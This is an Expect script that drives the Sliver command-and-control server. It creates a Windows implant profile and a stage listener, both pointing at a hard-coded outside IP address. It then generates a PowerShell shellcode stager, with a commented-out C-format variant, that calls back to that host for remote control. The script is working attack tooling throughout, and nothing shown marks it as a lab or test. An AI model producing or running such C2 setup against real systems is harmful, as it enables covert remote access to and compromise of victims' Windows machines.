#!/usr/bin/expect

if {$argc != 1} {
    puts "Usage: $argv0 <payload_c>"
    exit 1
}

set payload_c [lindex $argv 0]
puts $payload_c
# set payload_c "./data/payloads/win_stager.c"
# puts $payload_c

# # Prepare configs file for teams
# exec ./tools/sliver/get_configs.sh

# Activate Sliver server
spawn sliver-server

# Wait for sliver-server to start (you can adjust the sleep duration as needed)
sleep 0.1

# Continue using sliver-server
send "profiles new --mtls 18.143.102.216:8080 --skip-symbols --format shellcode --arch amd64 win64\r"
send "stage-listener --url tcp://18.143.102.216:1234 --profile win64\r"
send "jobs\r"

# this following is using for creating shellcode in c format to comple exe
# send "generate stager --lhost 18.143.102.216 --lport 1234 --protocol tcp --arch amd64 --format c --save $payload_c\r"

# this following is using for creating shellocde in ps1 format
send "generate stager --lhost 18.143.102.216 --lport 1234 --protocol tcp --arch amd64 --format ps1 --save $payload_c\r"

# Wait for the file $payload_c to exist
set timeout 200
expect {
    timeout {
        puts "Error: Timed out waiting for $payload_c to be generated."
        exit 1
    }
    -re {Sliver implant stager saved to: (.+)} {
        set generated_file_path [string trim $expect_out(1,string)]
        puts "\nCreate/Save stager_c at $generated_file_path successfully!"
    }
}

# Now send the exit command
send "exit\r"

# Wait for the process to finish
wait
